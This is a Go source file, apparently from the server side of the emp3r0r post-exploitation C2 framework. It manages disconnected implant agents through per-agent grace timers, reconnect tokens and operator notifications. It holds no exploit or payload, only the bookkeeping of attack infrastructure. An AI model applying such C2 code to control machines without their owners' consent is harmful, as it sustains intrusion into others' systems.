package server

import (
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// maxAgentOfflineGrace is a safety bound on an agent-supplied timer. It is not
// a default and never overrides an agent's own value.
const maxAgentOfflineGrace = 24 * time.Hour

// agentDisconnectGen distinguishes the latest offline event for a UUID from
// older delayed-forget timers.
var agentDisconnectGen sync.Map // uuid -> int64

// markAgentReconnected cancels any pending offline-expiry for the agent.
func markAgentReconnected(uuid string) {
	if uuid != "" {
		agentDisconnectGen.Delete(uuid)
	}
}

// agentOfflineGrace reports the removal deadline chosen by this agent. Each
// agent reports its own value; the C2 has no global grace policy. An agent that
// reports no deadline is removed immediately.
func agentOfflineGrace(agent *def.Emp3r0rAgent) (time.Duration, bool) {
	if agent == nil || agent.OfflineGrace <= 0 {
		return 0, false
	}
	grace := time.Duration(agent.OfflineGrace) * time.Second
	if grace > maxAgentOfflineGrace {
		grace = maxAgentOfflineGrace
	}
	return grace, true
}

// removeAgentNow drops the agent from the operator-facing list and reports it
// as disconnected.
func removeAgentNow(agent *def.Emp3r0rAgent) {
	live.ForgetAgent(agent.UUID)
	operatorBroadcastPrintf(logging.ERROR,
		"Agent dies... %s is disconnected", util.AgentRef(agent.UUID))
	_ = agents.EndSession(agent.UUID)
}

// publishAgentOffline keeps an agent visible with no live tunnel for the
// deadline that agent reported. A reconnect (or a newer disconnect) wins by
// changing/deleting the generation token.
func publishAgentOffline(agent *def.Emp3r0rAgent) {
	if agent == nil || agent.UUID == "" {
		return
	}
	grace, keep := agentOfflineGrace(agent)
	if !keep {
		removeAgentNow(agent)
		return
	}

	gen := time.Now().UnixNano()
	agentDisconnectGen.Store(agent.UUID, gen)
	live.PublishAgent(&live.AgentRecord{Agent: agent, Control: nil})

	time.AfterFunc(grace, func() {
		cur, ok := agentDisconnectGen.Load(agent.UUID)
		if !ok || cur != gen {
			return
		}
		removed := false
		if rec, ok := live.LookupAgent(agent.UUID); ok {
			if rec.Control != nil && rec.Control.Conn != nil {
				return // reconnected
			}
			live.ForgetAgent(agent.UUID)
			removed = true
		}
		agentDisconnectGen.Delete(agent.UUID)
		if removed {
			operatorBroadcastPrintf(logging.ERROR,
				"Agent dies... %s is disconnected", util.AgentRef(agent.UUID))
		}
		_ = agents.EndSession(agent.UUID)
	})
}
